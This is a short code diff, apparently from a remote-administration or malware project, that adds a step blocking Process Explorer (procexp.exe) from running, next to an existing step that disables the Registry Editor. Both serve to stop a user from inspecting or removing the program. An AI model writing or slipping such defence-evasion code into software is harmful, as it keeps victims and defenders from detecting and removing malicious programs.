@@ -135,4 +135,12 @@ void ToAlwaysDo() {
         appendToRichConsole("[ToAlwaysDo] Disable Registry Editor", resultat ? "OK" : "KO");
         #endif
         #endif
+        
+        // On désactive le lancement de "procexp.exe"
+        #if DISABLE_TASK_MANAGER == TRUE
+        resultat = disallowExeRun("procexp.exe", "1");
+        #if NO_GUI == FALSE
+        appendToRichConsole("[ToAlwaysDo] Disallow Run procexp.exe", resultat ? "OK" : "KO");
+        #endif
+        #endif
 }
